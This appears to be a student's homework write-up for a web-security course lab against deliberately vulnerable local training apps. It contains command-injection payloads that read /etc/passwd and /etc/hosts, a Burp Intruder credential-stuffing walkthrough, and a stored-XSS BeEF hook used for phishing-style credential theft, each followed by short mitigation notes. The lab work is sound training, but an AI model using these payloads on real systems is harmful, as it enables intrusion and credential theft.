### Week 15 Homework: Web Vulnerabilities and Hardening Homework
To launch the environment, complete the following:


-Launch Vagrant from GitBash or the Mac terminal using the following command: `vagrant up`


-Then, open the command line inside Vagrant and run the following command: `cd ./Documents/web-vulns && docker-compose up`.


-Leave this page open and continue to the next step.


-To access the Replicants website, open a web browser within Vagrant and access the following webpage: http://192.168.13.25/setup.php.


-On the bottom of this page, click Create / Reset Database.


-This will configure the database for the application.


-The message "Setup Successful" at the bottom of the page will indicate that it is complete.


-To log in to the mock Replicants website, access the following webpage: http://192.168.13.25/login.php.


-Log in with the following credentials:


- Username:`admin`


- Password: `password`


Now that you have determined that Replicants new application is vulnerable to command injection, you are tasked with using the `dot-dot-slash` method to design two payloads that will display the contents of the following files:

- `etc/passwd`

`8.8.8.8 && cat ../../../../../etc/passwd`

![cat ../../../../../etc/passwd](https://github.com/liligobellan/Unit-15-HW/blob/main/images15/passwd.png "cat ../../../../../etc/passwd")

- `etc/hosts`

`8.8.8.8 && cat ../../../../../etc/hosts`

![cat ../../../../../etc/hosts](https://github.com/liligobellan/Unit-15-HW/blob/main/images15/hosts%20.png "cat ../../../../../etc/hosts")


For this tasks had to use dot-dot method and use five slashes because there was five directories `/var/www/html/vulerabilities/exec`

*Mitigation Strategies*

- Keep up to date and keep patching the application often. 
- Use Strong Input Validation for Input Passed into Commands.
- Add less privileges to restric access to the web server. 


#### Web Application 2: *A Brute Force to Be Reckoned With*

-Open a browser on Vagrant and navigate to the webpage http://192.168.13.35/install.php.

- click `here` to install and then use the login credenitals:


Login: `bee`


Password: `bug`

To access the application where we will perform our activity, enter in the following URL: http://192.168.13.35/ba_insecure_login_1.php

This page is an administrative web application that serves as a simple login page. An administrator enters their username and password and selects Login.
  
  -If the user/password combination is correct, it will return a successful message.

  -If the user/password combination is incorrect, it will return the message, "Invalid credentials."
  
  You've been provided with a list of administrators and the breached passwords:
  
  ### *List of Administrators*
  
        - superman
          loislane
          spiderman
          jennyjones
          tonystark
          timtom
          peterparker
          clarkkent
          michaelsmith
          henryhacker


### *Breached list of Passwords*

       - Up, up and away!
         Avengers Assemble
         Cowabunga! 
         Here I come to Save the Day
         With great power comes great responsibility
         You wouldn’t like me when I’m angry
         Courage is immortal
         I am Iron Man
         His Past. Our future
         Change is coming


-Hint: Refer back to the Burp Intruder activity `10_Brute_Force from Day 3` for guidance.

- Click `Payloads tab`, choose Payload type as `Simple list`
- Add login user ID from List of Administrators file into `Payload set 1`
- Add password from Breached list of Passwords file into `Payload set 2`

After analyzing came across that administrator `tonystark` and the password `I am Iron Man` had successfully logged in output. 

![Success](https://github.com/liligobellan/Unit-15-HW/blob/main/images15/success.png)

*Mitigation Strategies*

- Lock out the accounts from accessing the server after many attempts of incorrect credentals. 
- Make the Root User Inaccessible via SSH.
- Making sure in using strong passwords. 

### Web Application 3: *Where's the BeEF?*

On Vagrant, open a command line and run the following command: `sudo beef`


When prompted for a password, enter `cybersecurity`.


This will kick off the BeEF application and return many details about the application to your terminal.


Along with these details are several URLs that can be used to access to BeEF's User Interface (UI). For example:`UI_URL: http://127.0.0.1:3000/ui/panel`


To access the BeEF GUI, right-click the first URL and select Open Link.

0nce on the webpage enter the credentals: 

- Username: `beef`


- Password: `feeb`

*Task Details*

The page you will test is the Replicants Stored XSS application which was used the first day of this unit: http://192.168.13.25/vulnerabilities/xss_s/

The BeEF hook, which was returned after running the sudo beef command was: http://127.0.0.1:3000/hook.js

The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`

When entering the command on the http://192.168.13.25/vulnerabilities/xss_s/, you'll notice that you can't enter it completly. 

Right click on the webpage and select "Inspecting Element"

Edit the textarea maxlength to 100. 

![EDITING](https://github.com/liligobellan/Unit-15-HW/blob/main/images15/editing-maxlength.png)

Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:


Social Engineering >> Pretty Theft

![pretty theft](https://github.com/liligobellan/Unit-15-HW/blob/main/images15/pretty-theft.png)

Social Engineering >> Fake Notification Bar

![FAKEPOPUP](https://github.com/liligobellan/Unit-15-HW/blob/main/images15/fake-popup.png)

*Mitigation Strategies*

- Input validation revolves around the act of ascertaining that the accurate data is being rendered by an application while at the same time blocking malevolent data from causing damage to the web page

- Sanitizing user input is another effective way of prevent XSS attacks. 




